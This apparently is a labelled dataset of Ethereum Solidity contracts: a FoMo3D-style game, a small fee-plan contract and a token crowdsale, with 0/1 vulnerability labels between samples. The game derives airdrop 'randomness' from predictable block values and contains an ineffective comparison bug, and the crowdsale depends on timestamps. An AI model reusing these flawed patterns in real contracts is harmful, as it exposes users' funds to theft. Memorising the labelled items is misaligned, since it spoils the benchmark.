_eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                         emit F3Devents.onWithdrawAndDistribute            (                msg.sender,                plyr_[_pID].name,                _eth,                _eventData_.compressedData,                _eventData_.compressedIDs,                _eventData_.winnerAddr,                _eventData_.winnerName,                _eventData_.amountWon,                _eventData_.newPot,                _eventData_.P3DAmount,                _eventData_.genAmount            );                 } else {                         _eth = withdrawEarnings(_pID);                         if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                         emit F3Devents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);        }    }         function registerNameXID(string _nameString, uint256 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }    function registerNameXaddr(string _nameString, address _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }    function registerNameXname(string _nameString, bytes32 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }             function getBuyPrice()        public        view        returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );        else              return ( 67000000000000 );      }         function getTimeLeft()        public        view        returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;        if (_now < round_[_rID].end)            if (_now > round_[_rID].strt + rndGap_)                return( (round_[_rID].end).sub(_now) );            else                return( (round_[_rID].strt + rndGap_).sub(_now) );        else            return(0);    }         function getPlayerVaults(uint256 _pID)        public        view        returns(uint256 ,uint256, uint256)    {                 uint256 _rID = rID_;                 if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         if (round_[_rID].plyr == _pID)            {                return                (                    (plyr_[_pID].win).add( ((round_[_rID].pot).mul(48)) / 100 ),                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)   ),                    plyr_[_pID].aff                );                         } else {                return                (                    plyr_[_pID].win,                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)  ),                    plyr_[_pID].aff                );            }                 } else {            return            (                plyr_[_pID].win,                (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                plyr_[_pID].aff            );        }    }         function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)        private        view        returns(uint256)    {        return(  ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000)  );    }         function getCurrentRoundInfo()        public        view        returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;        return        (            round_[_rID].ico,                            _rID,                                        round_[_rID].keys,                           round_[_rID].end,                            round_[_rID].strt,                           round_[_rID].pot,                            (round_[_rID].team + (round_[_rID].plyr * 10)),                  plyr_[round_[_rID].plyr].addr,               plyr_[round_[_rID].plyr].name,               rndTmEth_[_rID][0],                          rndTmEth_[_rID][1],                          rndTmEth_[_rID][2],                          rndTmEth_[_rID][3],                          airDropTracker_ + (airDropPot_ * 1000)                       );    }         function getPlayerInfoByAddress(address _addr)        public        view        returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;        if (_addr == address(0))        {            _addr == msg.sender;        }        uint256 _pID = pIDxAddr_[_addr];        return        (            _pID,                                            plyr_[_pID].name,                                plyrRnds_[_pID][_rID].keys,                      plyr_[_pID].win,                                 (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                    plyr_[_pID].aff,                                 plyrRnds_[_pID][_rID].eth                    );    }             function buyCore(uint256 _pID, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))        {                         core(_rID, _pID, msg.value, _affID, _team, _eventData_);                 } else {                         if (_now > round_[_rID].end && round_[_rID].ended == false)            {                 			    round_[_rID].ended = true;                _eventData_ = endRound(_eventData_);                                 _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);                _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                 emit F3Devents.onBuyAndDistribute                (                    msg.sender,                    plyr_[_pID].name,                    msg.value,                    _eventData_.compressedData,                    _eventData_.compressedIDs,                    _eventData_.winnerAddr,                    _eventData_.winnerName,                    _eventData_.amountWon,                    _eventData_.newPot,                    _eventData_.P3DAmount,                    _eventData_.genAmount                );            }                         plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);        }    }         function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, F3Ddatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))        {                                                   plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);                         core(_rID, _pID, _eth, _affID, _team, _eventData_);                 } else if (_now > round_[_rID].end && round_[_rID].ended == false) {                         round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                         emit F3Devents.onReLoadAndDistribute            (                msg.sender,                plyr_[_pID].name,                _eventData_.compressedData,                _eventData_.compressedIDs,                _eventData_.winnerAddr,                _eventData_.winnerName,                _eventData_.amountWon,                _eventData_.newPot,                _eventData_.P3DAmount,                _eventData_.genAmount            );        }    }         function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {                 if (plyrRnds_[_pID][_rID].keys == 0)            _eventData_ = managePlayer(_pID, _eventData_);                 if (round_[_rID].eth < 100000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 1000000000000000000)        {            uint256 _availableLimit = (1000000000000000000).sub(plyrRnds_[_pID][_rID].eth);            uint256 _refund = _eth.sub(_availableLimit);            plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);            _eth = _availableLimit;        }                 if (_eth > 1000000000)        {                         uint256 _keys = (round_[_rID].eth).keysRec(_eth);                         if (_keys >= 1000000000000000000)            {            updateTimer(_keys, _rID);                         if (round_[_rID].plyr != _pID)                round_[_rID].plyr = _pID;            if (round_[_rID].team != _team)                round_[_rID].team = _team;                         _eventData_.compressedData = _eventData_.compressedData + 100;        }                         if (_eth >= 100000000000000000)            {            airDropTracker_++;            if (airdrop() == true)            {                                 uint256 _prize;                if (_eth >= 10000000000000000000)                {                                         _prize = ((airDropPot_).mul(75)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                         airDropPot_ = (airDropPot_).sub(_prize);                                         _eventData_.compressedData += 300000000000000000000000000000000;                } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {                                         _prize = ((airDropPot_).mul(50)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                         airDropPot_ = (airDropPot_).sub(_prize);                                         _eventData_.compressedData += 200000000000000000000000000000000;                } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {                                         _prize = ((airDropPot_).mul(25)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                         airDropPot_ = (airDropPot_).sub(_prize);                                         _eventData_.compressedData += 300000000000000000000000000000000;                }                                 _eventData_.compressedData += 10000000000000000000000000000000;                                 _eventData_.compressedData += _prize * 1000000000000000000000000000000000;                                 airDropTracker_ = 0;            }        }                         _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);                         plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);            plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);                         round_[_rID].keys = _keys.add(round_[_rID].keys);            round_[_rID].eth = _eth.add(round_[_rID].eth);            rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);                         _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);            _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);             		    endTx(_pID, _team, _eth, _keys, _eventData_);        }    }             function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)        private        view        returns(uint256)    {        return(  (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask)  );    }         function calcKeysReceived(uint256 _rID, uint256 _eth)        public        view        returns(uint256)    {                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].eth).keysRec(_eth) );        else              return ( (_eth).keys() );    }         function iWantXKeys(uint256 _keys)        public        view        returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );        else              return ( (_keys).eth() );    }             function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if (pIDxAddr_[_addr] != _pID)            pIDxAddr_[_addr] = _pID;        if (pIDxName_[_name] != _pID)            pIDxName_[_name] = _pID;        if (plyr_[_pID].addr != _addr)            plyr_[_pID].addr = _addr;        if (plyr_[_pID].name != _name)            plyr_[_pID].name = _name;        if (plyr_[_pID].laff != _laff)            plyr_[_pID].laff = _laff;        if (plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }         function receivePlayerNameList(uint256 _pID, bytes32 _name)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if(plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }         function determinePID(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {        uint256 _pID = pIDxAddr_[msg.sender];                 if (_pID == 0)        {                         _pID = PlayerBook.getPlayerID(msg.sender);            bytes32 _name = PlayerBook.getPlayerName(_pID);            uint256 _laff = PlayerBook.getPlayerLAff(_pID);                         pIDxAddr_[msg.sender] = _pID;            plyr_[_pID].addr = msg.sender;            if (_name != "")            {                pIDxName_[_name] = _pID;                plyr_[_pID].name = _name;                plyrNames_[_pID][_name] = true;            }            if (_laff != 0 && _laff != _pID)                plyr_[_pID].laff = _laff;                         _eventData_.compressedData = _eventData_.compressedData + 1;        }        return (_eventData_);    }         function verifyTeam(uint256 _team)        private        pure        returns (uint256)    {        if (_team < 0 || _team > 3)            return(2);        else            return(_team);    }         function managePlayer(uint256 _pID, F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                          if (plyr_[_pID].lrnd != 0)            updateGenVault(_pID, plyr_[_pID].lrnd);                 plyr_[_pID].lrnd = rID_;                 _eventData_.compressedData = _eventData_.compressedData + 10;        return(_eventData_);    }         function endRound(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                 uint256 _rID = rID_;                 uint256 _winPID = round_[_rID].plyr;        uint256 _winTID = round_[_rID].team;                 uint256 _pot = round_[_rID].pot;                          uint256 _win = (_pot.mul(48)) / 100;        uint256 _com = (_pot / 50);        uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;        uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;        uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);                 uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);        if (_dust > 0)        {            _gen = _gen.sub(_dust);            _res = _res.add(_dust);        }                 plyr_[_winPID].win = _win.add(plyr_[_winPID].win);                 _com = _com.add(_p3d.sub(_p3d / 2));        admin.transfer(_com);        _res = _res.add(_p3d / 2);                 round_[_rID].mask = _ppt.add(round_[_rID].mask);                 _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);        _eventData_.winnerAddr = plyr_[_winPID].addr;        _eventData_.winnerName = plyr_[_winPID].name;        _eventData_.amountWon = _win;        _eventData_.genAmount = _gen;        _eventData_.P3DAmount = _p3d;        _eventData_.newPot = _res;                 rID_++;        _rID++;        round_[_rID].strt = now;        round_[_rID].end = now.add(rndInit_).add(rndGap_);        round_[_rID].pot = _res;        return(_eventData_);    }         function updateGenVault(uint256 _pID, uint256 _rIDlast)        private    {        uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);        if (_earnings > 0)        {                         plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);                         plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);        }    }         function updateTimer(uint256 _keys, uint256 _rID)        private    {                 uint256 _now = now;                 uint256 _newTime;        if (_now > round_[_rID].end && round_[_rID].plyr == 0)            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);        else            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);                 if (_newTime < (rndMax_).add(_now))            round_[_rID].end = _newTime;        else            round_[_rID].end = rndMax_.add(_now);    }         function airdrop()        private        view        returns(bool)    {        uint256 seed = uint256(keccak256(abi.encodePacked(            (block.timestamp).add            (block.difficulty).add            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add            (block.gaslimit).add            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add            (block.number)        )));        if((seed - ((seed / 1000) * 1000)) < airDropTracker_)            return(true);        else            return(false);    }         function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {                 uint256 _p1 = _eth / 100;        uint256 _com = _eth / 5;        _com = _com.add(_p1);        uint256 _p3d;        if (!address(admin).call.value(_com)())        {                                                                                          _p3d = _com;            _com = 0;        }                 uint256 _aff = _eth / 8;                          if (_affID != _pID && plyr_[_affID].name != '') {            plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);            emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);        } else {            _p3d = _p3d.add(_aff);        }                 _p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));        if (_p3d > 0)        {                         uint256 _potAmount = _p3d / 2;            admin.transfer(_p3d.sub(_potAmount));            round_[_rID].pot = round_[_rID].pot.add(_potAmount);                         _eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);        }        return(_eventData_);    }    function potSwap()        external        payable    {                 uint256 _rID = rID_ + 1;        round_[_rID].pot = round_[_rID].pot.add(msg.value);        emit F3Devents.onPotSwapDeposit(_rID, msg.value);    }         function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {                 uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;                 uint256 _air = (_eth / 100);        airDropPot_ = airDropPot_.add(_air);                 _eth = _eth.sub(((_eth.mul(14)) / 100).add((_eth.mul(fees_[_team].p3d)) / 100));                 uint256 _pot = _eth.sub(_gen);                          uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);        if (_dust > 0)            _gen = _gen.sub(_dust);                 round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);                 _eventData_.genAmount = _gen.add(_eventData_.genAmount);        _eventData_.potAmount = _pot;        return(_eventData_);    }         function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)        private        returns(uint256)    {                          uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        round_[_rID].mask = _ppt.add(round_[_rID].mask);                          uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);        plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);                 return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));    }         function withdrawEarnings(uint256 _pID)        private        returns(uint256)    {                 updateGenVault(_pID, plyr_[_pID].lrnd);                 uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);        if (_earnings > 0)        {            plyr_[_pID].win = 0;            plyr_[_pID].gen = 0;            plyr_[_pID].aff = 0;        }        return(_earnings);    }         function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private    {        _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);        emit F3Devents.onEndTx        (            _eventData_.compressedData,            _eventData_.compressedIDs,            plyr_[_pID].name,            msg.sender,            _eth,            _keys,            _eventData_.winnerAddr,            _eventData_.winnerName,            _eventData_.amountWon,            _eventData_.newPot,            _eventData_.P3DAmount,            _eventData_.genAmount,            _eventData_.potAmount,            airDropPot_        );    }             bool public activated_ = false;    function activate()        public    {                 require(msg.sender == admin, "only admin can activate");                 require(activated_ == false, "FOMO Short already activated");                 activated_ = true;                 rID_ = 1;            round_[1].strt = now + rndExtra_ - rndGap_;            round_[1].end = now + rndInit_ + rndExtra_;    }}    library F3Ddatasets {                                                                                                                                                               struct EventReturns {        uint256 compressedData;        uint256 compressedIDs;        address winnerAddr;                  bytes32 winnerName;                  uint256 amountWon;                   uint256 newPot;                      uint256 P3DAmount;                   uint256 genAmount;                   uint256 potAmount;               }    struct Player {        address addr;            bytes32 name;            uint256 win;             uint256 gen;             uint256 aff;             uint256 lrnd;            uint256 laff;        }    struct PlayerRounds {        uint256 eth;             uint256 keys;            uint256 mask;            uint256 ico;         }    struct Round {        uint256 plyr;            uint256 team;            uint256 end;             bool ended;              uint256 strt;            uint256 keys;            uint256 eth;             uint256 pot;             uint256 mask;            uint256 ico;             uint256 icoGen;          uint256 icoAvg;      }    struct TeamFee {        uint256 gen;             uint256 p3d;         }    struct PotSplit {        uint256 gen;             uint256 p3d;         }}    library F3DKeysCalcShort {    using SafeMath for *;         function keysRec(uint256 _curEth, uint256 _newEth)        internal        pure        returns (uint256)    {        return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));    }         function ethRec(uint256 _curKeys, uint256 _sellKeys)        internal        pure        returns (uint256)    {        return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));    }         function keys(uint256 _eth)        internal        pure        returns(uint256)    {        return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000);    }         function eth(uint256 _keys)        internal        pure        returns(uint256)    {        return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());    }}    interface PlayerBookInterface {    function getPlayerID(address _addr) external returns (uint256);    function getPlayerName(uint256 _pID) external view returns (bytes32);    function getPlayerLAff(uint256 _pID) external view returns (uint256);    function getPlayerAddr(uint256 _pID) external view returns (address);    function getNameFee() external view returns (uint256);    function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256);} library NameFilter {         function nameFilter(string _input)        internal        pure        returns(bytes32)    {        bytes memory _temp = bytes(_input);        uint256 _length = _temp.length;                 require (_length <= 32 && _length > 0, "string must be between 1 and 32 characters");                 require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, "string cannot start or end with space");                 if (_temp[0] == 0x30)        {            require(_temp[1] != 0x78, "string cannot start with 0x");            require(_temp[1] != 0x58, "string cannot start with 0X");        }                 bool _hasNonNumber;                 for (uint256 i = 0; i < _length; i++)        {                         if (_temp[i] > 0x40 && _temp[i] < 0x5b)            {                                 _temp[i] = byte(uint(_temp[i]) + 32);                                 if (_hasNonNumber == false)                    _hasNonNumber = true;            } else {                require                (                                         _temp[i] == 0x20 ||                                         (_temp[i] > 0x60 && _temp[i] < 0x7b) ||                                         (_temp[i] > 0x2f && _temp[i] < 0x3a),                    "string contains invalid characters"                );                                 if (_temp[i] == 0x20)                    require( _temp[i+1] != 0x20, "string cannot contain consecutive spaces");                                 if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))                    _hasNonNumber = true;            }        }        require(_hasNonNumber == true, "string cannot be only numbers");        bytes32 _ret;        assembly {            _ret := mload(add(_temp, 32))        }        return (_ret);    }} library SafeMath {         function mul(uint256 a, uint256 b)        internal        pure        returns (uint256 c)    {        if (a == 0) {            return 0;        }        c = a * b;        require(c / a == b, "SafeMath mul failed");        return c;    }         function sub(uint256 a, uint256 b)        internal        pure        returns (uint256)    {        require(b <= a, "SafeMath sub failed");        return a - b;    }         function add(uint256 a, uint256 b)        internal        pure        returns (uint256 c)    {        c = a + b;        require(c >= a, "SafeMath add failed");        return c;    }         function sqrt(uint256 x)        internal        pure        returns (uint256 y)    {        uint256 z = ((add(x,1)) / 2);        y = x;        while (z < y)        {            y = z;            z = ((add((x / z),z)) / 2);        }    }         function sq(uint256 x)        internal        pure        returns (uint256)    {        return (mul(x,x));    }         function pwr(uint256 x, uint256 y)        internal        pure        returns (uint256)    {        if (x==0)            return (0);        else if (y==0)            return (1);        else        {            uint256 z = x;            for (uint256 i=1; i < y; i++)                z = mul(z,x);            return (z);        }    }}
0<CODESPLIT>contract NokuFlatPlan {    uint256 public nextPaymentTime;         function payFee() public returns(bool paid) {        require(block.timestamp < nextPaymentTime);        return true;    }}
1<CODESPLIT>contract CryptualProjectToken is StandardToken, Ownable {  using SafeMath for uint256;     string public constant name = "Cryptual Project Token";    string public constant symbol = "CPT";    uint8 public constant decimals = 0;       uint256 public constant INITIAL_SUPPLY = 283000000;  address public wallet;     uint256 public constant PRESALE_OPENING_TIME = 1531998000;    uint256 public constant PRESALE_CLOSING_TIME = 1532563200;    uint256 public constant PRESALE_RATE = 150000;  uint256 public constant PRESALE_WEI_CAP = 500 ether;  uint256 public constant PRESALE_WEI_GOAL = 50 ether;       uint256 public constant CROWDSALE_OPENING_TIME = 1532602800;    uint256 public constant CROWDSALE_CLOSING_TIME = 1535328000;    uint256 public constant CROWDSALE_WEI_CAP = 5000 ether;     uint256 public constant COMBINED_WEI_GOAL = 750 ether;       uint256[] public crowdsaleWeiAvailableLevels = [1000 ether, 1500 ether, 2000 ether];  uint256[] public crowdsaleRates = [135000, 120000, 100000];  uint256[] public crowdsaleMinElapsedTimeLevels = [0, 12 * 3600, 18 * 3600, 21 * 3600, 22 * 3600];  uint256[] public crowdsaleUserCaps = [1 ether, 2 ether, 4 ether, 8 ether, CROWDSALE_WEI_CAP];  mapping(address => uint256) public crowdsaleContributions;     uint256 public presaleWeiRaised;  uint256 public crowdsaleWeiRaised;     constructor(    address _wallet  ) public {    require(_wallet != address(0));    wallet = _wallet;    totalSupply_ = INITIAL_SUPPLY;    balances[msg.sender] = INITIAL_SUPPLY;    emit Transfer(0x0, msg.sender, INITIAL_SUPPLY);  }     event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);     function () external payable {    buyTokens(msg.sender);  }     function buyTokens(address _beneficiary) public payable {    uint256 weiAmount = msg.value;    require(_beneficiary != address(0));    require(weiAmount != 0);    bool isPresale = block.timestamp >= PRESALE_OPENING_TIME && block.timestamp <= PRESALE_CLOSING_TIME;    bool isCrowdsale = block.timestamp >= CROWDSALE_OPENING_TIME && block.timestamp <= CROWDSALE_CLOSING_TIME;    require(isPresale || isCrowdsale);    uint256 tokens;    if (isCrowdsale) {      require(crowdsaleWeiRaised.add(weiAmount) <= CROWDSALE_WEI_CAP);      require(crowdsaleContributions[_beneficiary].add(weiAmount) <= getCrowdsaleUserCap());                   tokens = _getCrowdsaleTokenAmount(weiAmount);      require(tokens != 0);             crowdsaleWeiRaised = crowdsaleWeiRaised.add(weiAmount);    } else if (isPresale) {      require(presaleWeiRaised.add(weiAmount) <= PRESALE_WEI_CAP);      require(whitelist[_beneficiary]);                   tokens = weiAmount.mul(PRESALE_RATE).div(1 ether);      require(tokens != 0);             presaleWeiRaised = presaleWeiRaised.add(weiAmount);    }    _processPurchase(_beneficiary, tokens);    emit TokenPurchase(      msg.sender,      _beneficiary,      weiAmount,      tokens    );    if (isCrowdsale) crowdsaleContributions[_beneficiary] = crowdsaleContributions[_beneficiary].add(weiAmount);    deposited[_beneficiary] = deposited[_beneficiary].add(msg.value);  }     function getCrowdsaleUserCap() public view returns (uint256) {    require(block.timestamp >= CROWDSALE_OPENING_TIME && block.timestamp <= CROWDSALE_CLOSING_TIME);         uint256 elapsedTime = block.timestamp.sub(CROWDSALE_OPENING_TIME);    uint256 currentMinElapsedTime = 0;    uint256 currentCap = 0;    for (uint i = 0; i < crowdsaleUserCaps.length; i++) {      if (elapsedTime < crowdsaleMinElapsedTimeLevels[i]) continue;      if (crowdsaleMinElapsedTimeLevels[i] < currentMinElapsedTime) continue;      currentCap = crowdsaleUserCaps[i];    }    return currentCap;  }     function _getCrowdsaleTokenAmount(uint256 _weiAmount) internal view returns (uint256) {    uint256 uncountedWeiRaised = crowdsaleWeiRaised;    uint256 uncountedWeiAmount = _weiAmount;    uint256 tokenAmount = 0;    for (uint i = 0; i < crowdsaleWeiAvailableLevels.length; i++) {      uint256 weiAvailable = crowdsaleWeiAvailableLevels[i];      uint256 rate = crowdsaleRates[i];            if (uncountedWeiRaised < weiAvailable) {        if (uncountedWeiRaised > 0) {          weiAvailable = weiAvailable.sub(uncountedWeiRaised);          uncountedWeiRaised = 0;        }        if (uncountedWeiAmount <= weiAvailable) {          tokenAmount = tokenAmount.add(uncountedWeiAmount.mul(rate));          break;        } else {          uncountedWeiAmount = uncountedWeiAmount.sub(weiAvailable);          tokenAmount = tokenAmount.add(weiAvailable.mul(rate));        }      } else {        uncountedWeiRaised = uncountedWeiRaised.sub(weiAvailable);      }    }    return tokenAmount.div(1 ether);  }     function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {    totalSupply_ = totalSupply_.add(_tokenAmount);    balances[_beneficiary] = balances[_beneficiary].add(_tokenAmount);    emit Transfer(0x0, _beneficiary, _tokenAmount);  }       mapping(address => bool) public whitelist;     function addToPresaleWhitelist(address _beneficiary) external onlyOwner {    whitelist[_beneficiary] = true;  }     function addManyToPresaleWhitelist(address[] _beneficiaries) external onlyOwner {    for (uint256 i = 0; i < _beneficiaries.length; i++) {      whitelist[_beneficiaries[i]] = true;    }  }     function removeFromPresaleWhitelist(address _beneficiary) external onlyOwner {    whitelist[_beneficiary] = false;  }     bool public isCrowdsaleFinalized = false;  mapping (address => uint256) public deposited;     event CrowdsaleFinalized();  event RefundsEnabled();  event Refunded(address indexed beneficiary, uint256 weiAmount);     function finalizeCrowdsale() external {    require(!isCrowdsaleFinalized);    require(block.timestamp > CROWDSALE_CLOSING_TIME || (block.timestamp > PRESALE_CLOSING_TIME && presaleWeiRaised < PRESALE_WEI_GOAL));    if (combinedGoalReached()) {      wallet.transfer(address(this).balance);    } else {      emit RefundsEnabled();    }    emit CrowdsaleFinalized();    isCrowdsaleFinalized = true;  }     function claimRefund() external {    require(isCrowdsaleFinalized);    require(!combinedGoalReached());    require(deposited[msg.sender] > 0);    uint256 depositedValue = deposited[msg.sender];    deposited[msg.sender] = 0;    msg.sender.transfer(depositedValue);    emit Refunded(msg.sender, depositedValue);  }     function combinedGoalReached() public view returns (bool) {    return presaleWeiRaised.add(crowdsaleWeiRaised) >= COMBINED_WEI_GOAL;  }}
